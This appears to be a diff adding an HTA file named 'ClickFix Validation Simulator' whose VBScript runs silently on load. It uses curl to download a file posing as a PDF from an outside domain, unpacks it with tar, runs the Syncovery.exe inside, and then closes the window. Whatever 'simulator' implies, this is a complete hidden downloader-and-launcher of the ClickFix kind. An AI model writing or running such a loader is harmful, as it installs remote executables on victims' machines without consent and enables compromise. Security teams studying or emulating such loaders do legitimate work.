@@ -1,0 +1,51 @@
+<html>
+<head>
+<title>ClickFix Validation Simulator</title>
+
+<HTA:APPLICATION
+  ID="ClickFixSim"
+  APPLICATIONNAME="ClickFix Validation Simulator"
+  BORDER="thin"
+  CAPTION="yes"
+  SHOWINTASKBAR="no"
+  SINGLEINSTANCE="yes"
+  SYSMENU="yes"
+  WINDOWSTATE="minimize"
+/>
+
+<script language="VBScript">
+Option Explicit
+
+Sub Window_OnLoad
+    Dim sh
+    Dim userProfile
+    Dim workDir
+    Dim fakePdf
+    Dim fakePdfUrl
+    Dim cmdDownload
+    Dim cmdExtractRun
+
+    Set sh = CreateObject("WScript.Shell")
+
+    userProfile = sh.ExpandEnvironmentStrings("%USERPROFILE%")
+    workDir = userProfile & "\Documents\928252966059280400"
+    fakePdf = workDir & "\928252966059280400.pdf"
+
+    fakePdfUrl = "http://latigobrewco.com/928252966059280400.pdf"
+
+    cmdDownload = "cmd.exe /c mkdir """ & workDir & """ 2>nul & curl -s -L -o """ & fakePdf & """ " & fakePdfUrl
+
+    cmdExtractRun = "cmd.exe /c tar -xf """ & fakePdf & """ -C """ & workDir & """ && """ & workDir & "\Syncovery.exe"""
+
+    sh.Run cmdDownload, 0, True
+    sh.Run cmdExtractRun, 0, False
+
+    window.close
+End Sub
+</script>
+</head>
+
+<body>
+Validation simulator.
+</body>
+</html>
